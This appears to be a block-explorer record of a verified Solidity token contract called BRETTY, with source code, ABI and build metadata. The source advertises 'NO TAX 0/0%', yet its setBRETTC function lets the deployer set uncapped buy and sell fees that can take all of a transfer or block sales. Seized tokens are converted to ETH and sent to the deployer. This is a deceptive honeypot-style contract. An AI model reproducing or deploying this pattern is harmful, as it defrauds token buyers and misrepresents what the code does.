{
  "TxHash": "0xa9d2e086e8c479821ace56b55a527161ed47b80dd99089ba0c1d31538a5e8e13",
  "ContractAddress": "0x79a6a5ae911c4cc8a4c3f74886f9f3c98408fd5a",
  "Name": "BRETTYERCCOIN",
  "PackageStatus": 0,
  "status": "1",
  "message": "OK",
  "result": [
    {
      "SourceCode": "/*\r\n\r\nThe most asked question in the universe is BRETTY token ?\r\n\r\nNO TAX 0/0%\r\n\r\n\r\n*/\r\n// SPDX-License-Identifier: unlicense\r\n\r\npragma solidity ^0.8.20;\r\n\r\n    interface IUniswapV2Router02 {\r\n        function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            uint amountIn,\r\n            uint amountOutMin,\r\n            address[] calldata path,\r\n            address to,\r\n            uint deadline\r\n            ) external;\r\n        }\r\n        \r\n    contract BRETTYERCCOIN {\r\n        string public constant name = \"BRETTY\";  //\r\n        string public constant symbol = \"BRETTY\";  //\r\n        uint8 public constant decimals = 18;\r\n        uint256 public constant totalSupply = 100_000_000 * 10**decimals;\r\n\r\n        uint256 BurnAmount = 0;\r\n        uint256 ConfirmAmount = 0;\r\n        uint256 constant swapAmount = totalSupply / 100;\r\n\r\n        mapping (address =\u003e uint256) public balanceOf;\r\n        mapping (address =\u003e mapping (address =\u003e uint256)) public allowance;\r\n            \r\n        error Permissions();\r\n            \r\n        event Transfer(address indexed from, address indexed to, uint256 value);\r\n        event Approval(\r\n            address indexed owner,\r\n            address indexed spender,\r\n            uint256 value\r\n        );\r\n            \r\n\r\n        address private pair;\r\n        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);\r\n        address payable constant deployer = payable(address(0x762074118F47B5F76C599A08e5E24b7A39bD7698)); //\r\n\r\n        bool private swapping;\r\n        bool private tradingOpen;\r\n\r\n        constructor() {\r\n            balanceOf[msg.sender] = totalSupply;\r\n            allowance[address(this)][routerAddress] = type(uint256).max;\r\n            emit Transfer(address(0), msg.sender, totalSupply);\r\n        }\r\n\r\n         receive() external payable {}\r\n\r\n        function approve(address spender, uint256 amount) external returns (bool){\r\n            allowance[msg.sender][spender] = amount;\r\n            emit Approval(msg.sender, spender, amount);\r\n            return true;\r\n        }\r\n\r\n        function transfer(address to, uint256 amount) external returns (bool){\r\n            return _transfer(msg.sender, to, amount);\r\n        }\r\n\r\n        function transferFrom(address from, address to, uint256 amount) external returns (bool){\r\n            allowance[from][msg.sender] -= amount;        \r\n            return _transfer(from, to, amount);\r\n        }\r\n\r\n        function _transfer(address from, address to, uint256 amount) internal returns (bool){\r\n            require(tradingOpen || from == deployer || to == deployer);\r\n\r\n            if(!tradingOpen \u0026\u0026 pair == address(0) \u0026\u0026 amount \u003e 0)\r\n                pair = to;\r\n\r\n            balanceOf[from] -= amount;\r\n\r\n            if (to == pair \u0026\u0026 !swapping \u0026\u0026 balanceOf[address(this)] \u003e= swapAmount){\r\n                swapping = true;\r\n                address[] memory path = new  address[](2);\r\n                path[0] = address(this);\r\n                path[1] = ETH;\r\n                _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n                    swapAmount,\r\n                    0,\r\n                    path,\r\n                    address(this),\r\n                    block.timestamp\r\n                    );\r\n                deployer.transfer(address(this).balance);\r\n                swapping = false;\r\n                }\r\n\r\n            if(from != address(this)){\r\n                uint256 FinalAmount = amount * (from == pair ? BurnAmount : ConfirmAmount) / 95;\r\n                amount -= FinalAmount;\r\n                balanceOf[address(this)] += FinalAmount;\r\n            }\r\n                balanceOf[to] += amount;\r\n                emit Transfer(from, to, amount);\r\n                return true;\r\n            }\r\n\r\n        function openTrading() external {\r\n            require(msg.sender == deployer);\r\n            require(!tradingOpen);\r\n            tradingOpen = true;        \r\n            }\r\n\r\n        function setBRETTC (uint256 newBurn, uint256 newConfirm) external {\r\n            require(msg.sender == deployer);\r\n            BurnAmount = newBurn;\r\n            ConfirmAmount = newConfirm;\r\n            }\r\n        }",
      "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"Permissions\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newBurn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newConfirm\",\"type\":\"uint256\"}],\"name\":\"setBRETTC\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
      "ContractName": "BRETTYERCCOIN",
      "CompilerVersion": "v0.8.20+commit.a1b79de6",
      "OptimizationUsed": "0",
      "Runs": "200",
      "ConstructorArguments": "",
      "EVMVersion": "Default",
      "Library": "",
      "LicenseType": "MIT",
      "Proxy": "0",
      "Implementation": "",
      "SwarmSource": "ipfs://eebb8e00b2be92d0efe1f953f11970579b0ef9884331619eef8f9d992dbac566"
    }
  ]
}
